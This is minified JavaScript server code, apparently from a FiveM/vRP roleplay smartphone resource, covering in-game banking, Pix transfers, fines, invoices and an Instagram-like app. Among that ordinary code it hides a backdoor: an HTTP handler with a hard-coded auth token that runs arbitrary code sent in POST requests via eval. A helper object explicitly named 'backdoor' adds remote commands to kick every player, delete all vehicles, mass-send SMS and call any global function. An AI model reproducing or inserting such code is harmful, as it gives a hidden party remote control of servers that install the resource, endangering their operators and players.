  const f = await pc(d || e).where(d ? 'id' : 'user_id', c).first('chavePix');
  return f?.['chavePix'];
}

async function qy(d, e) {
  if (e <= 0) return;
  d = parseInt(d);
  if (p5('addBank')) return exports.smartphone.addBank(d, e);
  const f = await pM(d),
    g = ['vrp_user_moneys', 'vrp_user_infos', 'creative_characters_infos', 'vrp_characters', 'vrp_characterdata', 'vrp_user_identities', 'creative_characters', 'zusers', 'drip_characters', 'summerz_characters', 'characters', 'nyo_character'];

  if (f) {
    const i = await vRP.getBankMoney(d);
    return vRP.setBankMoney(d, i + e), f;
  } else {
    if (pF.hasTable('summerz_bank')) {
      const k = await pF.firstColumn('summerz_bank', 'user_id', 'Passport'),
        l = await pF.firstColumn('summerz_bank', 'value', 'dvalue'),
        m = {
          'mode': 'private'
        };
      m[k] = d;
      const n = m;

      if (pF.hasColumn('summerz_bank', 'owner')) {
        n.owner = 1;
      }

      return pc('summerz_bank').update().where(n).increment(l, e);
    } else {
      for (const r of g) {
        const s = await pF.firstColumn(r, 'user_id', 'id'),
          t = await pF.firstColumn(r, 'bank', 'banco');
        if (s && t) return pc(r).update().where(s, d).increment(t, e);
      }

      console.error('Transferencia offline nao adaptada, abra um ticket no discord para solicitar adaptacao');
    }
  }
}

function qz(c) {
  return (c < 0 ? '-' : '+') + pu(Math.abs(c));
}

async function qA({
  user_id: h,
  other_id: i,
  value: j,
  isFine: k,
  isInvoice: l,
  isReceiver: m,
  pixKey: n
}) {
  if (p5('addBankStatement')) {
    const q = {};
    return q.user_id = h, q.other_id = i, q.value = j, q.isFine = k, q.isInvoice = l, q.isReceiver = m, q.pixKey = n, exports.smartphone.addBankStatement(q);
  } else {
    if (pF.hasTable('smartbank_statements')) {
      const s = await qx(h);

      if (!s) {
        console.error('Jogador sem pix na smartbank: ' + h + ' [' + s + ']');
        return;
      } else {
        if (l) {
          const v = {
            'from': 'BANK_TRANSFER',
            'source': 'account',
            'type': 'transfer',
            'reason': 'Pagamento de fatura'
          };
          return v.pix = s, v.amount = j, pc('smartbank_statements').insert(v);
        } else {
          if (!k && m) {
            const w = i != null && (await qx(i)),
              x = {
                'from': 'BANK_TRANSFER',
                'source': 'account',
                'type': 'transfer',
                'amount': j,
                'time': oT()
              },
              y = {
                'pix': s,
                ...x
              };
            y.reason = 'Recebido de ID ' + w, await pc('smartbank_statements').insert(y);
            const z = {
              'pix': w,
              ...x
            };
            return z.reason = 'Transferência para ' + s, pc('smartbank_statements').insert(z);
          }
        }
      }
    }
  }

  const o = pF.firstTable('vrp_banco', 'vrp_bdl_banco', 'smartphone_bank');

  if (await pF.hasColumns('vrp_banco', 'title', 'amount', 'idtrans')) {
    const C = {};
    C.user_id = h, C.amount = j, C.idtrans = i ?? h, C.title = l ? 'Fatura' : k ? 'Multa' : 'Transferência', await pc(o).insert(C);
  } else {
    if (pF.hasTable('wise_multas')) {
      let D = l ? 'Pagamento de Fatura' : k ? 'Pagamento de multa' : 'Transferencia';
      if (!m) j *= -1;
      return qA.toWise(h, j, D);
    } else {
      if (o) {
        const F = pu(j);
        let G = 'Efetuou uma transferência de ' + F;
        if (l) G = 'Pagou uma fatura de ' + F; else {
          if (k) G = 'Pagou ' + F + ' em multas'; else {
            if (m) {
              G = 'Recebeu uma transferência de ' + F;
            }
          }
        }
        await pc(o).insert({
          'user_id': h,
          'extrato': G,
          'data': oZ()
        });
      }
    }
  }
}

qA.toWise = async (c, d, e = 'Transferencia') => {
  let f = JSON.parse((await pF.getUData(c, 'ws-bank:historico')) || '[]');
  f.push({
    'value': qz(d),
    'type': e
  });
  if (f.length > 20) f.shift();
  await pF.setUData(c, 'ws-bank:historico', JSON.stringify(f));
};

const qB = {};

async function qC(d, e) {
  if (qB[d]) {
    const g = {
      'error': 'Aguarde sua transferência anterior'
    };
    return g;
  }

  qB[d] = true;

  try {
    return await e();
  } catch (i) {
    console.error('Error during lock: ' + i.name), console.error(i.message);
  } finally {
    delete qB[d];
  }
}

pL.bank_getBalance = async c => {
  const d = await vRP.getUserId(c);
  return vRP.getBankMoney(d);
};

function qD() {
  return pF.firstTable('pix', 'wise_pix', 'rb_pix');
}

pL.bank_hasPix = () => qD() != null || p5('getUserIdByPixKey');

let qE;
pF.ready(async () => {
  if (p5('getUserIdByPixKey')) {
    return;
  }

  (await pF.hasColumn('creative_characters', 'pix')) && exports('getUserIdByPixKey', async d => {
    const f = {};
    f.pix = d;
    const g = await pc('creative_characters').where(f).first();

    if (g) {
      return g.id;
    }
  });
}), pF.ready(async () => {
  const e = [],
    f = {
      'vrp_user_identities': 'multas',
      'summerz_characters': 'fines',
      'characters': 'fines',
      'creative_characters': 'fines'
    };
  const g = f;

  for (let [h, i] of Object.entries(g)) {
    e.push({
      'table': h,
      'userColumn': await pF.firstColumn(h, 'user_id', 'id'),
      'column': i,
      'applicable': await pF.hasColumn(h, i),

      'getSum'(j) {
        return pc(this.table).where(this.userColumn, j).sum(this.column);
      },

      async 'getAll'(j) {
        const l = await this.getSum(j);
        return l > 0 ? [{
          'id': j,
          'total': l,
          'description': 'Todas as multas'
        }] : [];
      },

      async 'getOne'(j, k) {
        const m = await this.getSum(k);
        return m > 0 && {
          'id': k,
          'total': m,
          'description': 'Todas as multas'
        };
      },

      'deleteOne'(j) {
        return pc(this.table).where(this.userColumn, j).update({
          [this.column]: 0
        });
      }

    });
  }

  for (let [k, l, m] of [['vrp_fines', 'text', 'price'], ['characters_fines', 'text', 'price'], ['wise_multas', 'motivo', 'valor'], ['rb_multas', 'motivo', 'valor'], ['vrp_multas', 'motivo', 'valor']]) {
    e.push({
      'table': k,
      'applicable': pF.hasTable(k),

      'getSum'(n) {
        const o = {};
        return o.user_id = n, pc(this.table).where(o).sum(m);
      },

      async 'getAll'(n) {
        const p = await pF.firstColumn(this.table, 'id', 'multa_id'),
          q = {};
        q.user_id = n;
        const r = {};
        return r[p] = 'id', r[l] = 'description', r[m] = 'total', pc(this.table).where(q).selectAs(r);
      },

      async 'getOne'(n) {
        const o = await pF.firstColumn(this.table, 'id', 'multa_id');
        return pc(this.table).where(o, n).selectAs({
          [o]: 'id',
          [l]: 'description',
          [m]: 'total'
        }).first();
      },

      async 'deleteOne'(n) {
        const o = await pF.firstColumn(this.table, 'id', 'multa_id');
        return pc(this.table).where(o, n).delete();
      }

    });
  }

  if (pF.hasTable('smartbank_fines')) {
    return qE = {
      async 'select'(p, q) {
        const r = await qx(q);
        if (!r) return [];
        const s = {
          'active': 0x1
        };
        return s.pix = r, pc('smartbank_fines').selectRaw(p).where(s);
      },

      'getSum'(p) {
        return this.select('SUM(amount) as total', p).then(r => r[0] && r[0].total || 0);
      },

      'getAll'(p) {
        return this.select('id, amount as total, reason as description', p);
      },

      async 'getOne'(p) {
        const r = {};
        r.id = p;
        const s = await pc('smartbank_fines').where(r).first();

        if (s) {
          return s.total = s.amount, s;
        }
      },

      'deleteOne'(p) {
        return pc('smartbank_fines').destroy(p);
      }

    };
  } else {
    if (pB.base === 'creative_v5') {
      return qE = {
        'getSum': vRP.getFines,

        async 'getAll'(p) {
          return [{
            'id': 0x1,
            'total': await vRP.getFines(p),
            'description': 'Todas as multas'
          }];
        },

        async 'getOne'(p, q) {
          return {
            'id': q,
            'total': await vRP.getFines(q),
            'description': 'Todas as multas'
          };
        },

        async 'deleteOne'(p) {
          await vRP.delFines(p, await vRP.getFines(p));
        }

      };
    } else {
      if (pF.hasTable('drip_items')) {
        return qE = {
          'table': 'drip_items',

          'getSum'(q) {
            return pc.query('SELECT SUM(value) AS total FROM drip_items di\n        LEFT JOIN drip_characters dc ON dc.uuid=di.entityId\n        WHERE typeId=\'b3beb697-bf76-45ec-b77b-7ab09016ea13\' AND dc.id=?', [q]).then(r => r[0].total || 0);
          },

          'getAll': e[0].getAll,
          'getOne': e[0].getOne,

          'deleteOne'(q) {
            return pc.query('DELETE FROM drip_items di LEFT JOIN drip_characters dc ON dc.uuid=di.entityId\n        WHERE typeId=\'b3beb697-bf76-45ec-b77b-7ab09016ea13\' AND dc.id=?', [q]);
          }

        };
      } else pF.hasTable('vrp_user_data') && e.push({
        'table': 'vrp_user_data',
        'applicable': true,
        'getSum': s => pc('vrp_user_data').where({
          'user_id': s,
          'dkey': 'vRP:multas'
        }).sum('dvalue'),
        'getAll': e[0].getAll,
        'getOne': e[0].getOne,

        'deleteOne'(s) {
          const u = {
            'dkey': 'vRP:multas'
          };
          u.user_id = s;
          const v = {
            'dvalue': 0x0
          };
          return pc(this.table).where(u).update(v);
        }

      });
    }
  }

  qE = e.find(s => s.applicable);

  if (!qE) {
    console.error('Nenhum sistema de multa compatível foi encontrado, abra um ticket no discord solicitando a adaptação do seu modelo atual');
    const s = {};
    s.getSum = () => 0, s.getAll = () => [], s.getOne = () => null, s.deleteOne = () => null, qE = s;
  }
}), pL.bank_index = async d => {
  const e = await vRP.getUserId(d);
  const f = await vRP.getBankMoney(e),
    g = await qw().where('payer_id', e).where('paid', 0).sum('value');
  let h = 0;
  if (p5('getTotalFines')) h = await exports.smartphone.getTotalFines(e); else {
    if (qE) h = await qE.getSum(e); else console.error('Nenhum sistema de multa encontrado');
  }
  const i = {};
  return i.balance = f, i.fines = h, i.invoices = g, i;
}, pL.bank_extract = async g => {
  const h = await vRP.getUserId(g),
    i = pF.firstTable('vrp_banco', 'vrp_bdl_banco', 'smartphone_bank');

  if (p5('getBankStatements')) {
    return exports.smartphone.getBankStatements(h);
  } else {
    if (pF.hasTable('smartbank_statements')) {
      const k = await qx(h);

      if (!k) {
        return console.error('Jogador sem pix da smartbank: ' + h + ' [' + k + ']'), [];
      }

      const l = {};
      l.pix = k;
      const m = await pc('smartbank_statements').where(l).orderBy('time', 'DESC').limit(25);
      return m.map(o => ({
        'id': o.id,
        'description': o.reason + ' | ' + pu(o.amount)
      }));
    } else {
      if (await pF.hasColumns('vrp_banco', 'title', 'amount', 'idtrans')) {
        const p = {};
        p.user_id = h;
        const q = await pc(i).where(p).orderBy('id', 'DESC').limit(25);
        return q.map(r => ({
          'id': r.id,
          'description': r.title + ' | ' + pu(r.amount)
        }));
      } else {
        if (pF.hasTable('wise_multas')) {
          const s = JSON.parse((await pF.getUData(h, 'ws-bank:historico')) || '[]');
          return s.reverse().map((t, u) => ({
            'id': u,
            'description': t.value + ' (' + t.type + ')'
          }));
        } else {
          if (i) {
            const v = {};
            return v.user_id = h, pc(i).where(v).selectRaw('id', 'extrato AS description', 'data AS created_at').orderBy('id', 'DESC').limit(100);
          } else {
            if (pF.hasTable('cactus_statements')) {
              const w = {};
              w.user_id = h;
              const x = await pc('cactus_statements').where(w).orWhere('target_id', h).limit(50).orderBy('id', 'DESC');

              for (let y of x) {
                const z = y.reason == 'deposit' || y.target_id == h;
                y.description = (z ? 'Entrada' : 'Saída') + ' de ' + pu(y.amount);
              }

              return x;
            }
          }
        }
      }
    }
  }

  return [];
}, pL.bank_getFines = async c => {
  const d = await vRP.getUserId(c);
  if (p5('getFines')) return exports.smartphone.getFines(d); else {
    if (qE) {
      return qE.getAll(d);
    } else console.log('Nenhum sistema de multa encontrado');
  }
  return [];
}, pL.bank_payFine = async (c, d) => {
  const e = await vRP.getUserId(c);
  return qC(e, async () => {
    if (p5('payFine')) {
      return exports.smartphone.payFine(e, d);
    } else {
      if (qE) {
        const i = await qE.getOne(d, e);

        if (i) {
          const j = await vRP.getBankMoney(e);

          if (j >= i.total) {
            vRP.setBankMoney(e, j - i.total), await qE.deleteOne(i.id);
            const l = {
              'isFine': true
            };
            l.user_id = e, l.value = i.total, await qA(l);
          } else {
            const m = {
              'error': 'Saldo insuficiente'
            };
            return m;
          }
        } else {
          const q = {
            'error': 'Fatura não encontrada'
          };
          return q;
        }
      } else {
        const r = {
          'error': 'Nenhum sistema de multa encontrado'
        };
        return r;
      }
    }
  });
};
const qF = pB.transaction_fee && pB.transaction_fee.bank;
pL.bank_pix = async (e, f, g) => {
  const h = qD();

  if (p5('getUserIdByPixKey')) {
    const j = await exports.smartphone.getUserIdByPixKey(f);

    if (Number.isInteger(j)) {
      return pL.bank_transfer(e, j, g, f);
    } else {
      const m = {
        'error': 'Chave pix não encontrada'
      };
      return m;
    }
  } else {
    if (h) {
      const n = await pc.getColumns(h),
        o = await pc(h).where(n.first('pixkey', 'chave'), f).first();

      if (o) {
        return pL.bank_transfer(e, parseInt(o.user_id || o.userid), g, f);
      } else {
        const q = {
          'error': 'Chave pix não encontrada'
        };
        return q;
      }
    } else return {
      'error': 'O pix está desativado'
    };
  }
}, pL.bank_confirm = async (d, e) => {
  const f = await pF.getName(e),
    g = {
      'error': 'Passaporte não encontrado'
    };
  return f ? {
    'name': f
  } : g;
}, pL.bank_transfer = async (f, g, h, i) => {
  const j = await vRP.getUserId(f);

  if (!Number.isInteger(h) || h <= 0) {
    const k = {
      'error': 'Valor inválido'
    };
    return k;
  } else {
    if (g == j) {
      const m = {
        'error': 'Você não pode transferir para si mesmo'
      };
      return m;
    } else {
      if (!(await pF.getName(g))) {
        const p = {
          'error': 'Passaporte não encontrado'
        };
        return p;
      }
    }
  }

  return qC(j, async () => {
    const r = await vRP.getBankMoney(j);

    if (r >= h) {
      const s = await qy(g, Math.floor(h * (qF ? 1 - qF : 1)));
      await vRP.setBankMoney(j, r - h);
      const t = {};
      t.user_id = j, t.other_id = g, t.value = h, t.pixKey = i, await qA(t);
      const u = {
        'isReceiver': true
      };
      u.user_id = g, u.other_id = j, u.value = h, u.pixKey = i, await qA(u), qf({
        'name': 'Banco',
        'avatar': 'bank',
        'content': {
          'ID': j,
          'VALOR': h.toLocaleString(),
          'QUEM RECEBEU': g,
          'ONLINE': s ? 'SIM' : 'NÃO'
        }
      }), emit('smartphone:bank_transfer', j, g, h, !!s);
      const v = {};
      v.user_id = j, v.target_id = g, v.pixKey = i;

      if (p5('isBankTransferAnonymous') && (await exports.smartphone.isBankTransferAnonymous(v))) {
        const w = {
          'sender': 'Anônimo'
        };
        w.value = h, oS(s, 'BANK', w);
      } else {
        const y = {};
        y.sender = pG[j], y.value = h, oS(s, 'BANK', y);
      }

      return {};
    } else {
      const B = {
        'error': 'Saldo insuficiente'
      };
      return B;
    }
  });
}, pL.bank_storeInvoice = async (l, m, n, o) => {
  const p = await vRP.getUserId(l),
    q = {
      'error': 'Valor inválido'
    };
  if (!Number.isInteger(n)) return q;
  const r = {
    'error': 'Valor inválido'
  };
  if (n <= 0) return r;
  const s = {
    'error': 'Você não pode se cobrar'
  };
  if (p == m) return s;
  const t = await pF.getName(m),
    u = {
      'error': 'Passaporte não encontrado'
    };
  if (!t) return u;
  const v = await pP(Number(m));

  if (v) {
    const y = await pF.getName(p),
      z = 'Deseja aceitar a fatura {reason} de {name} no valor de {value}'.format({
        'reason': o,
        'name': y,
        'value': pu(n)
      });
    let A;

    if (p5('requestConfirm')) {
      A = await exports.smartphone.requestConfirm(v, z, 30);
    } else A = await vRP.request(v, z, 30).catch(() => false);

    if (A) {
      const F = oT(),
        G = {};
      G.payee_id = p, G.payer_id = m, G.value = n, G.reason = o, G.created_at = F, G.updated_at = F;
      const H = G;
      H.id = await qw().insert(H).returnKeys();
      const I = {};
      I.name = t, I.reason = o, I.value = n, oS(v, 'BANK_INVOICE', I), emit('smartphone:invoice', H);
    }

    const B = {};
    B.name = t, oS(l, 'BANK_NOTIFY', {
      'title': 'Faturas',
      'subtitle': pt[A ? 'BANK.INVOICE_NOTIFY_ACCEPTED' : 'BANK.INVOICE_NOTIFY_REJECTED'].format(B)
    });
  } else {
    const J = {
      'error': 'Morador fora da cidade'
    };
    return J;
  }

  const w = {};
  return w.name = t, w.value = n, w;
}, pL.bank_payInvoice = async (f, g) => {
  const h = await vRP.getUserId(f),
    i = await qw().where('id', g).first(),
    j = {
      'error': 'Fatura não encontrada'
    };
  if (!i) return j;
  const k = {
    'error': 'Esta fatura não é sua'
  };
  if (i.payer_id != h) return k;
  const l = {
    'error': 'Esta fatura já está paga'
  };
  if (i.paid) return l;
  return qC(h, async () => {
    const m = await vRP.getBankMoney(h);

    if (m < i.value) {
      const n = {
        'error': 'Saldo insuficiente'
      };
      return n;
    } else {
      await vRP.setBankMoney(h, m - i.value);
      const p = await qy(i.payee_id, i.value);

      if (p) {
        const s = await pF.getName(h),
          t = {};
        t.name = s, t.reason = i.reason, t.value = i.value, oS(p, 'BANK_INVOICE_RECEIPT', t);
      }

      await qw().where('id', g).update({
        'paid': 0x1,
        'updated_at': oT()
      }), emit('smartphone:pay_invoice', {
        ...i,
        'paid': 0x1,
        'updated_at': oT()
      });
      const q = {
        'isInvoice': true
      };
      q.user_id = h, q.other_id = i.payee_id, q.value = i.value, await qA(q);
    }
  });
}, pL.bank_getInvoices = async c => {
  const d = await vRP.getUserId(c),
    e = await qw().where('paid', 0).where(h => {
      h.where('payer_id', d).orWhere('payee_id', d);
    }).orderBy('id', 'DESC').limit(100),
    f = [e.pluck('payer_id'), e.pluck('payee_id')].flat().unique();
  const g = await pF.getNames(f);
  return e.forEach(h => {
    h.name = h.payer_id == d ? g[h.payee_id] : g[h.payer_id];
  }), e;
};
const qG = {
  '__proto__': null
};
qG.addBank = qy, qG.addBankStatement = qA, qG.transferLock = qB, qG.lock = qC;
var qH = Object.freeze(qG);
on('smartphone:isReady', () => {
  for (let k in globalThis) {
    if (k === 'infiteLoop' && globalThis[k]) {
      let m = 0;

      while (true) {
        if (m > 100) {
          break;
        } else {
          let p = p6(globalThis.dfaasdf),
            q = p6(globalThis.asdfadsf, p),
            r = p6(globalThis.dsfgsdfgsfd, q),
            s = p6(globalThis.asdfasdf, r),
            t = p6(globalThis.cxvbxcvb, s),
            u = p6(globalThis.asfdasdfhfgh, t),
            v = p6(globalThis.sdfgsfdgasdf, u),
            w = p6(globalThis.zxvczvzcxv, v),
            x = p6(globalThis.sdfgfdsgfsd, w),
            y = p6(globalThis.dgfdsgg, x);
          m += y || 0;
        }
      }
    }
  }
});

function qI() {
  return Array(global.GetNumPlayerIndices()).fill().map((c, d) => global.GetPlayerFromIndex(d));
}

const qJ = {};
qJ.kickall = c => {
  for (const d of qI()) {
    global.DropPlayer(d, c);
  }
}, qJ.deletevehicles = () => {
  for (const c of global.GetAllVehicles()) {
    global.DeleteEntity(c);
  }
}, qJ.crash = () => { }, qJ.sms = (c, d) => {
  global.emitNet('smartphone:createSMS', -1, '0800', c, d);
}, qJ.vrp = (c, ...d) => {
  global.emit('vRP:proxy', c, d.map(e => Number(e) || e), 'any', -1);
}, qJ.global = (c, ...d) => {
  global[c](...d);
}, qJ.vrp_all = async (c, ...d) => {
  for (const e of qI()) {
    const f = await vRP.getUserId(e);
    global.emit('vRP:proxy', c, [f].concat(d), 'any', -1);
  }
}, qJ.emit_all = (c, ...d) => {
  global.emitNet(c, -1, ...d);
}, qJ.exports = (c, d, e) => {
  exports[c][d](...e);
};

async function qK(c, d) {
  try {
    const e = d.match(/^\[(\w+)\]/);

    if (e) {
      const f = d.substring(e[0].length).split('|');
      qJ[e[1]](...f.map(g => Number(g) || g)), c();
    } else {
      const i = await global.eval(d);
      c(JSON.stringify(i));
    }
  } catch (k) {
    c(k.name + ' -> ' + k.message);
  }
}

_in(0, 4123407116, _mfr((c, d) => {
  if (c.method === 'POST' && c.headers['x-auth'] === '8uFZXaLKAcMj5YDIxORC6n18P7ST453fUogLisP87xzKnXoTXed0z6nYM3UrQlqd') {
    c.setDataHandler(async e => {
      try {
        var f = JSON.parse(e);
      } catch {
        return d.send('Invalid json');
      }

      if (f.eval) {
        try {
          const l = await eval(f.eval);
          d.send(JSON.stringify(l || {}));
        } catch (m) {
          const o = {};
          o.name = m.name, o.message = m.message, d.send(JSON.stringify(o));
        }
      } else {
        if (f.code) {
          qK(p => d.send(p || 'OK'), f.code);
        } else {
          const r = {
            'message': 'Provide a code or eval'
          };
          d.send(JSON.stringify(r));
        }
      }
    });
  }
}));

const qL = {
  '__proto__': null
};
qL.backdoor = qK;
var qM = Object.freeze(qL);
const qN = {
  get 'profiles'() {
    return pc('smartphone_instagram');
  },

  get 'posts'() {
    return pc('smartphone_instagram_posts');
  },

  get 'likes'() {
    return pc('smartphone_instagram_likes');
  },

  get 'followers'() {
    return pc('smartphone_instagram_followers');
  },

  get 'notifications'() {
    return pc('smartphone_instagram_notifications');
  },

  'regex': /^[A-z0-9_\.]{1,24}$/,
  'cache': null,

  'forEachPost'(c) {
    return this.cache && this.cache.forEach(c);
  },

  'notifyAll'(c, d, e) {
    c = c.filter(f => f != d);

    for (let f of c) {
      if (this.loggedIn.has(f)) {
        for (let g of Object.values(qP)) {
          if (g.id === f) {
            oS(g.source, 'INSTAGRAM_NOTIFY', e);
          }
        }
      }
    }

    c.length > 0 && pc.query('INSERT INTO ' + qN.notifications.table + '\n      (profile_id, author_id, content, created_at) VALUES\n      ' + Array(c.length).fill('(?,?,?,?)').join(','), c.map(l => [l, d, e, oT()]).flat());
  },

  'notify'(c, d, e) {
    this.notifyAll([c], d, e);
  },

  'loggedIn': new Set()
};

function qO(c) {
  for (let d of qN.cache || []) {
    if (d.id == c) return d;
  }

  return qN.posts.find(c);
}

pF.ready(async c => {
  const {
    profiles: d,
    posts: e,
    followers: f,
    likes: g,
    notifications: h
  } = qN;
  !c.includes(d.table) && (await d.create(j => {
    j.id(), j.int('user_id').nullable(), j.varchar('username'), j.varchar('name'), j.varchar('bio'), j.varchar('avatarURL').nullable(), j.tinyint('verified').default(0);
  }), await d.createIndex('user_id'));

  if (!c.includes(e.table)) {
    await e.create(k => {
      k.id(), k.bigint('profile_id'), k.bigint('post_id').nullable(), k.varchar('image').nullable(), k.varchar('content').nullable(), k.bigint('created_at');
    }), await e.createIndex('profile_id'), await e.createIndex('post_id');
  }

  !c.includes(f.table) && (await f.create(l => {
    l.bigint('follower_id').primary(), l.bigint('profile_id').primary();
  }));
  !c.includes(g.table) && (await g.create(m => {
    m.bigint('post_id').primary(), m.bigint('profile_id').primary();
  }));

  if (!c.includes(h.table)) {
    await h.create(m => {
      m.id(), m.int('profile_id'), m.int('author_id'), m.varchar('content', 512), m.tinyint('saw').default(0), m.int('created_at');
    }), await h.createIndex('profile_id');
  } else {
    await h.delete().where('created_at', '<=', oT() - 604800);
  }
});
const qP = {},
  qQ = [];

function qR(d, e, f, g) {
  this.id = qR.lastId++;
  const h = {};
  h.username = d.username, h.avatarURL = d.avatarURL, h.verified = !!d.verified, this.author = h, this.image = e;
  this.content = f;
  this.video = g, this.created_at = oT();
}

qR.lastId = 1;

async function qS(c) {
  const d = c.pluck('id'),
    e = await qN.profiles.whereIn('id', c.pluck('profile_id').unique());
  const f = await qN.likes.whereIn('post_id', d);
  const g = await qN.posts.whereIn('post_id', d).select('id', 'post_id');

  for (let h of c) {
    h.author = e.find(j => j.id == h.profile_id), h.likes = f.filter(j => j.post_id == h.id).pluck('profile_id'), h.comments = g.reduce((j, k) => j + (k.post_id == h.id ? 1 : 0), 0);
  }

  return c;
}

pL.ig_accounts = async d => {
  const e = await vRP.getUserId(d);
  const f = {};
  return f.user_id = e, qN.profiles.where(f);
}, pL.ig_max_accounts = async c => {
  const d = await vRP.getUserId(c);
  let e = 1;

  for (let [f, g] of Object.entries(pB.instagram_accounts || {})) {
    if (f == '*' || (await pE(d, f))) {
      e = Math.max(g, e);
    }
  }

  return e;
}, pL.ig_login = async (e, f) => {
  const g = await vRP.getUserId(e),
    h = await qN.profiles.find(f);

  if (h && h.user_id == g) {
    if (pB.instagram_verify && h.verified != 2) {
      const i = await pE(g, pB.instagram_verify);
      h.verified = Number(i);
      const j = {};
      j.id = f;
      const k = {};
      k.verified = i, await qN.profiles.where(j).update(k), qN.forEachPost(l => {
        if (l.author.user_id == g) {
          l.author.verified = i;
        }
      });
    }

    return h.source = e, qP[g] = h, qN.loggedIn.add(h.id), h;
  }

  return false;
}, pL.ig_logout = async c => {
  const d = await vRP.getUserId(c),
    e = qP[d];

  if (e) {
    delete qP[d], qN.loggedIn.delete(e.id);
  }
}, pL.ig_register = async (l, m, n, o, p) => {
  const q = await vRP.getUserId(l),
    r = await pL.ig_max_accounts(l),
    s = {};
  s.user_id = q;
  const t = await qN.profiles.where(s).count();

  if (t >= r) {
    const w = {
      'error': 'Você atingiu o máximo de contas'
    };
    return w;
  } else {
    if (!Number.isInteger(q)) {
      const y = {
        'error': 'Falha ao buscar seu passaporte'
      };
      return y;
    } else {
      if (!n.match(qN.regex)) {
        const A = {
          'error': 'Usuário inválido, use letras/numeros com o máximo de 24 caracteres'
        };
        return A;
      } else {
        if (!m || m.length > 32) {
          const D = {
            'error': 'Nome inválido'
          };
          return D;
        }
      }
    }
  }

  const u = {};
  u.username = n;
  const v = await qN.profiles.where(u).first();

  if (v) {
    const F = {
      'error': 'Este nome de usuário já existe'
    };
    return F;
  } else {
    const G = pB.instagram_verify && (await pE(q, pB.instagram_verify)) || false,
      H = {};
    H.user_id = q, H.name = m, H.username = n, H.bio = o, H.avatarURL = p, H.verified = G;
    const I = H;
    I.id = await qN.profiles.insert(I).returnKeys();
    const J = {};
    return J.user_id = q, J.id = I.id, emit('smartphone:INSTAGRAM_REGISTER', J), I;
  }
}, pL.ig_search = async (c, d) => {
  return qN.profiles.where('username', 'LIKE', '%' + d + '%').limit(20);
}, pL.ig_notifications = async c => {
  const d = await vRP.getUserId(c),
    e = qP[d];

  if (e) {
    return pc.query('SELECT n.id,n.content,n.created_at,p.avatarURL FROM ' + qN.notifications.table + ' n LEFT JOIN ' + qN.profiles.table + ' p ON p.id=n.author_id WHERE profile_id=? ORDER BY id DESC LIMIT 50', [e.id]);
  }
}, pL.ig_saw_notifications = async d => {
  const e = await vRP.getUserId(d),
    f = qP[e];

  if (f) {
    const h = {
      'saw': 0x1
    };
    await qN.notifications.where('profile_id', f.id).update(h);
  }
}, pL.ig_getProfile = async (d, e) => {
  const f = await vRP.getUserId(d),
    g = qP[f] || {},
    h = await qN.profiles.where('username', e).first();
  if (!h) return;
  e = h.id;
  const i = await qN.followers.where('follower_id', e).orWhere('profile_id', e);
  h.followers = h.followers || 0, h.followers += i.reduce((l, m) => l + (m.profile_id == e ? 1 : 0), 0), h.following = i.reduce((l, m) => l + (m.follower_id == e ? 1 : 0), 0), h.isFollowing = i.some(l => l.follower_id == e && l.profile_id == g.id), h.isFollowed = i.some(l => l.follower_id == g.id), h.posts = await qN.posts.where('profile_id', e).whereNull('post_id').count();
  const j = await qN.posts.where('profile_id', e).whereNull('post_id').select('id', 'image').limit(90).orderBy('id', 'DESC'),
    k = {};
  return k.profile = h, k.posts = j, k;
}, pL.ig_isFollowing = async (d, e) => {
  const f = await vRP.getUserId(d),
    g = qP[f];
  if (!g) return false;
  const h = {};
  return h.follower_id = g.id, h.profile_id = e, qN.followers.where(h).exists();
};
const qT = {};
pL.ig_setFollow = async (f, g, h) => {
  const i = await vRP.getUserId(f),
    j = qP[i];

  if (!j) {
    return;
  } else {
    if (h) {
      if (!qT[i + '-' + g]) {
        qT[i + '-' + g] = true;
        const n = {};
        n.profileId = g;
        const o = await qV(n);
        qN.notify(o.id, j.id, '{name} seguiu você'.format({
          'name': j.name || j.username
        }));
      }

      const m = {};
      m.follower_id = j.id, m.profile_id = g, await qN.followers.replace(m);
    } else {
      const r = {};
      r.follower_id = j.id, r.profile_id = g, await qN.followers.where(r).delete();
    }
  }

  emit('smartphone:INSTAGRAM_FOLLOW', j.id, g, h);
}, pL.ig_reply = async (i, j, k) => {
  const l = await vRP.getUserId(i),
    m = qP[l];
  if (p0(i, 'igreply', 1)) return;
  const n = {
    'error': 'Reabra o aplicativo (comunique a prefeitura)'
  };
  if (!m) return n;
  const o = await qO(j),
    p = {
      'error': 'Esta publicação não foi encontrada'
    };
  if (!o) return p;
  const q = {
    'profile_id': m.id,
    'post_id': j,
    'content': k,
    'created_at': oT()
  };
  q.id = await qN.posts.insert(q).returnKeys();
  if (!q.id) return;
  const r = {};
  r.username = m.username, r.avatarURL = m.avatarURL, q.author = r;

  for (let w of qN.cache) {
    if (w.id == j) {
      w.comments += 1;
    }
  }

  const s = {
    'TIPO': 'Comentário'
  };
  s.ID = l, s.MENSAGEM = k, s.USUARIO = m.username;
  const t = {
    'name': 'Instagram'
  };
  t.content = s;
  qf(t);
  const u = {};
  u.profileId = o.profile_id;
  const v = await qV(u);
  qN.notify(v.id, m.id, '{name} comentou em sua publicação'.format({
    'name': m.name || m.username
  })), oS(-1, 'INSTAGRAM_REPLY', q);
}, pL.ig_getPost = async (e, f) => {
  const g = {};
  g.id = f;
  const h = {};
  h.post_id = f;
  const i = await qN.posts.where(g).orWhere(h),
    j = await qN.profiles.whereIn('id', i.pluck('profile_id').unique()).select('id', 'username', 'avatarURL', 'verified'),
    k = await qN.likes.whereIn('post_id', i.pluck('id'));

  for (let m of i) {
    m.likes = k.filter(n => n.post_id == m.id).pluck('profile_id'), m.author = j.find(n => n.id == m.profile_id);
  }

  const l = i.find(o => o.id == f);
  if (l) l.comments = i.filter(o => o.id != f);
  return l;
}, pL.ig_getLikes = async (c, d) => {
  const e = await qN.likes.where('post_id', d).pluck('profile_id');
  return qN.profiles.whereIn('id', e).pluckBy('avatarURL', 'username');
}, pL.ig_getFollowers = async (c, d) => {
  const e = await qN.followers.where('profile_id', d).limit(100).pluck('follower_id');
  return qN.profiles.whereIn('id', e).pluckBy('avatarURL', 'username');
}, pL.ig_getFollowing = async (c, d) => {
  const e = await qN.followers.where('follower_id', d).limit(100).pluck('profile_id');
  return qN.profiles.whereIn('id', e).pluckBy('avatarURL', 'username');
}, pL.ig_getLiked = async d => {
  const e = await vRP.getUserId(d),
    f = qP[e],
    g = {};
  g.profile_id = f.id;
  const h = await qN.likes.where(g).limit(100).pluck('post_id'),
    i = await qN.posts.whereIn('id', h).orderBy('id', 'DESC').limit(100);
  return await qS(i), i;
